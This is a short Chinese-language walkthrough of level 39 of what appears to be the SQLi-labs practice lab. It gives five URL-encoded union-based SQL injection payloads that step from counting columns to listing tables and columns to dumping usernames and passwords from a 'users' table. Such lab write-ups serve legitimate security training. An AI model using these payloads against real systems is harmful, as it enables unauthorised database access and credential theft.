# Less-39

`id`参数是整数，正常联合注入就行



~~~ cmd
?id=-1%20union%20select%201,2,3
~~~

![Less-39-01](.\img\Less-39-01.png)



~~~ cmd
?id=-1%20union%20select%201,version(),database()
~~~

![Less-39-02](.\img\Less-39-02.png)



~~~ cmd
?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
~~~

![Less-39-03](.\img\Less-39-03.png)



~~~ cmd
?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='users'
~~~

![Less-39-04](.\img\Less-39-04.png)



~~~ cmd
?id=-1%20union%20select%201,2,group_concat(username,password)%20from%20users
~~~

![Less-39-05](.\img\Less-39-05.png)